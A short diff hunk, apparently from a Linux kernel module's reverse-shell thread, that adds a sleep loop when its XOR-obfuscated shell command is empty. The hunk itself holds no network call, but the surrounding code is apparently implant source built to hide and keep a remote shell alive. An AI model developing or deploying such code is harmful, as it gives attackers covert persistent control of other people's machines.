@@ -10,6 +10,9 @@ int rshell_func(void* data) {
     char xor_cmd[] = RSHELL_CMD_OBF;
     if (xor_cmd[0] == '\0') {
         pr_info("its empty");
+        while (!kthread_should_stop()) { // todo prettify
+            ssleep(10);
+        }
         return 0;
     }
     char command[256];
